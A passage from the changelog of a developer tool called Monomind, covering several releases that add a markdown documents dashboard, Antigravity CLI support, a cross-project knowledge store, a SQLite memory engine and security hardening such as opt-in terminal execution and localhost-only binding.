- **Global Documents dashboard section with markdown viewer** — new `📄 Documents` tab under the Global section. Surfaces mastermind-generated markdown across all known projects + the global brain, ordered by date, with a high-fidelity markdown renderer (headings with anchors, bold/italic/strikethrough, inline + fenced code with language label + copy button, unordered/ordered/nested/task lists, GFM tables with per-column alignment, nested blockquotes, horizontal rules, images, links with `rel=noopener`, YAML frontmatter stripping, HTML-escaped at boundary with `<script>`/`on*` handler stripping). Backend: `GET /api/global-docs` + `GET /api/global-doc/read?path=…` with path-traversal protection (403) and `.md`-only enforcement (400).
- **Dead-code cleanup** — deleted `transfer/types.ts` + `transfer/exports/` + dead `anonymization` exports (~740 LOC). Removed `eval-row6-*.json` from repo root and gitignored.
- **Pre-existing test failures fixed** — root-owned `.tmp-audit-test/` directory (leftover from a `sudo` run) was causing all 12 `tests/hive-mind/consensus.test.mjs` AuditWriter tests to fail with EACCES. Removed and gitignored.

#### ⚠️ Behavior changes (with escape hatches)

These changes are technically breaking for users who depended on the old behavior; each has a documented override.

- **`terminal_execute` now requires opt-in.** Set `MONOMIND_ENABLE_TERMINAL=1` or write `.monomind/enable-terminal.json` with `{"enabled":true}` to restore the old default-on behavior.
- **Dashboard + org servers bind to `127.0.0.1` only.** Set `MONOMIND_BROWSE_DASHBOARD_HOST=<host>` or `MONOMIND_ORG_SERVER_HOST=<host>` to bind a specific interface.
- **Crash-reporter redaction is stricter.** Stack traces now show basenames only (no project paths), and IPs/emails/hostnames/SSNs/phones are scrubbed. If you've been debugging crash-reporter output, you'll see less context.
- **`sql.js`-only fallback now fails honestly** instead of silently producing a non-functional DB. Install `sql.js` or `@monoes/memory` to re-enable.

#### 📝 Tracking follow-ups

11 items deferred with explicit rationale, each filed as a GitHub issue labeled [`review-swarm`](https://github.com/monoes/monomind/issues?q=label:review-swarm):

- #62 Delete `production/` dead-code package (v3.0.0 breaking change)
- #63 Curate unrouted agents in `.claude/agents/generated/`
- #64 Split god files (`init/executor.ts`, `monograph-tools.ts`, `OrgDaemon`)
- #65 Consolidate duplicated input-guard helpers
- #66 Add FTS5 to `memory_search` (biggest perf win, cross-package)
- #67 Bound dashboard maps with LRU eviction
- #68 Crash-reporter concurrency tests
- #69 Auto-update `executor`/`validator` tests (security boundary)
- #70 Wire up the dead LSP server + VS Code extension
- #71 Memory browser tab in dashboard
- #72 Real incremental graph updates (multi-day, biggest payoff)

Epic tracking all 11: **[#73](https://github.com/monoes/monomind/issues/73)**.

Full report: `docs/mastermind/reviews/2026-08-05-comprehensive-review-fixes.md`.

---

## [2.8.0] — 2026-07-31

### Antigravity (agy) Support

Monomind now officially supports **Google Antigravity (agy)** alongside Claude Code.

#### What's new

- **`monomind init` generates Antigravity files** — every init run now also creates:
  - `GEMINI.md` — agent instructions and MCP tool rules read by agy
  - `.gemini/rules/monomind.md` — workflow rules file (when to call monograph, memory, knowledge_search)
  - `.gemini/helpers/statusline.sh` — shell wrapper that drives the agy status bar
  - `.gemini/helpers/statusline.cjs` + `utils/` — full Node.js statusline engine (same as Claude Code)
  - `.gemini/settings.json` — wires `statusLine.command` so the status bar appears automatically

- **Status bar in agy** — the Monomind status bar (graph node count, stale nodes, agent routing, git state, session cost) now appears at the bottom of the agy chat window, exactly as it does in Claude Code's terminal UI. No manual setup required after `monomind init`.

- **Global agy settings auto-wired** — `monomind init` also updates `~/.gemini/antigravity-cli/settings.json` and writes `~/.gemini/antigravity-cli/statusline.sh` so the status bar works even before project-level init has run.

- **Org Runtime — multi-LLM providers** — `monomind org run` now supports `gemini` and `openai` provider kinds in org JSON files:
  ```json
  { "provider": { "kind": "gemini", "apiKeyEnv": "GEMINI_API_KEY" } }
  ```
  Org role sessions resolve `GEMINI_API_KEY` / `OPENAI_API_KEY` from the environment without embedding secrets.

- **`isDevRepo` sentinel relaxed** — the `[STALE_HELPERS]` check in `session-restore-handler.cjs` now correctly suppresses auto-heal when running inside the monomind dev repository (only `packages/@monomind/cli/package.json` presence required; no longer also requires the bundled `.claude/helpers` subtree).

## [2.5.0] — 2026-07-18


### Orgs can read your Second Brain
- Org agents get a `knowledge_search` tool: merged semantic search over the project's documents **and** your personal global brain, with the same project-first ranking as every other surface. Role briefings instruct agents to ground work in your actual documents; every lookup is a bus event visible in `org logs` / `org report`.

### Live document ingestion
- The dashboard server (long-lived, warm embedding model) watches the project and ingests changed `md/txt/pdf/docx` in-process within ~5 seconds of a save — no session restart needed. Platforms without recursive watch fall back silently to the session-start reindex.

### Global-brain polish
- Dashboard Second Brain search: project/global/all scope selector, `global` badges, real source-file labels.
- README + the generated per-project CLAUDE.md now teach the cross-project brain (auto-routing, `--store`, `--global`, OKF portability).

## [2.4.0] — 2026-07-18

### Global Second Brain (cross-project)
- One personal knowledge store at `~/.monomind/global-brain` (relocatable via `MONOMIND_GLOBAL_BRAIN_DIR`), structurally exempt from `cleanup --data`.
- **Zero-decision routing:** `doc ingest` on a path outside the current project auto-routes to the global brain (announced, overridable); `--global` forces it; `doc list/export --global`.
- **Merged retrieval everywhere:** `doc search`, the warm `/api/knowledge/search` endpoint, and per-prompt `[SECOND_BRAIN]` injection query project + global; project results win ties, global hits are labeled.
- Memory bridge refactored from a first-caller-wins singleton to a per-store instance cache (also fixes a latent store-misroute); excerpt provenance rides the `src:` ingest tag end-to-end.

## [2.3.x] — 2026-07-18

### 2.3.4 — Swarm-review hardening (round 2)
- Chunker: code-fence awareness (`#` lines in ``` blocks are never headings), CRLF normalization, backward-scan loop guards. (`@monoes/memory@1.0.8`)
- Memory engine: `UNIQUE(namespace,key)` enforced in better-sqlite3 (existing DBs deduped newest-wins), TTL-expired entries excluded from search, streaming row iteration.
- Org runtime: unified boss-selection for `org_complete` gating; `org answer` merges by question id instead of clobbering; `org logs` skips corrupt interior lines; `--run` flag validated; doc-metadata removal via append-only tombstones with compaction.
- Every failed CLI command now prints its failure reason (dispatcher-level fix).

Also in the 2.3.4 cycle: a 49-agent adversarial review of the week's modules confirmed 33 findings — **all 33 fixed**, including a critical `cleanup --data` rule that would have deleted live memory stores, and a silent org message-loss window during session restarts. Ledger: `docs/mastermind/plans/2026-07-18-swarm-review-findings.md`.

### 2.3.3 — Semantic per-prompt knowledge injection
- The dashboard server holds the local embedding model warm and serves `/api/knowledge/search` in ~60ms; every substantive Claude Code prompt gets its top knowledge excerpts injected automatically (`[SECOND_BRAIN]`), with tokenized keyword fallback and visible `(semantic)`/`(keyword)` provenance. Injection telemetry (never prompt text) in `.monomind/metrics/second-brain.jsonl`.

### 2.3.2 — Second Brain foundations
- Heading-aware chunking with `§ section` context prefixes; session-start reindex of changed documents; retrieval golden-set eval grown to 18 cases (80% paraphrase recall bar).
- Org cross-run memory: run outcomes stored per `memory_namespace`, `org_recall` tool for agents.
- `cleanup --data`: provable pruning of orphaned per-project stores via origin markers.
- Doctor: Second Brain model check.

### 2.3.1 — Memory engine replaced (LanceDB removed)
- The memory/Second Brain engine is now local SQLite (better-sqlite3, sql.js WASM fallback) storing text + embedding vectors, with local MiniLM embeddings — **~600MB of native dependencies removed** (`@lancedb/lancedb`, `apache-arrow`, onnx runtime stays for embeddings). (`@monoes/memory@1.0.6`)
- Fixed: semantic search over the native backend returned nothing (empty stub); keyword search required whole-phrase matches; namespace filters leaked across namespaces.
- Retrieval quality became a tested invariant: paraphrase golden-set eval in CI.

### 2.3.0 — Org Runtime v2 capability wave
- **Observability:** `org logs --follow` (live event tail), `org report` (outcome, per-role tokens vs budget, assets, crashes; `--all` for run history).
- **Outcomes + memory:** coordinator records run outcomes via `org_complete`; next run is briefed on the last; history in `<org>/history.jsonl`.
- **Headless HIL:** `org questions` / `org answer` — answer `ask_human` from the terminal, live or queued.
- **Resilience:** crashed agent sessions restart with backoff; crash detection in `org status`.
- **DX:** `org run --dry-run` (role-briefing preview), `org create --template content-team|dev-team|research-pod`, `org validate` (schema + structural invariants), informative `org list`, running-org guards on `stop`/`delete`.

## [2.2.0] — 2026-07-17 and earlier

- Org Runtime v2 (SDK daemon) baseline: per-role live agent sessions, `org_send` message bus, policy-gated tools, dashboard event forwarding, cross-process org discovery.
